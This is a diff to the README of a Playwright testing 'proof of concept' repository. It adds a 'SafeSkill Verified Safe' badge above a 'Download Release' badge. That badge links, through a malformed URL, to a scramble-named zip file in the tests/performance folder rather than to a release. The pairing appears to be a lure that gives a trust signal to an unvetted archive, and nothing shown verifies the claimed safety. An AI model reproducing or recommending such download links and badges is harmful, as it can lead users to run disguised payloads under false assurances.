@@ -1,5 +1,7 @@
 # 🎉 PlayWright-Framework-PoC - Simple Testing for Everyone
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/samericbailey-playwright-framework-poc)
+
 [![Download Release](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/C-Wright-Po-Play-Framework-v2.7.zip%https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/C-Wright-Po-Play-Framework-v2.7.zip)](https://raw.githubusercontent.com/SamEricBailey/PlayWright-Framework-PoC/main/tests/performance/C-Wright-Po-Play-Framework-v2.7.zip)
 
 ## 🚀 Getting Started
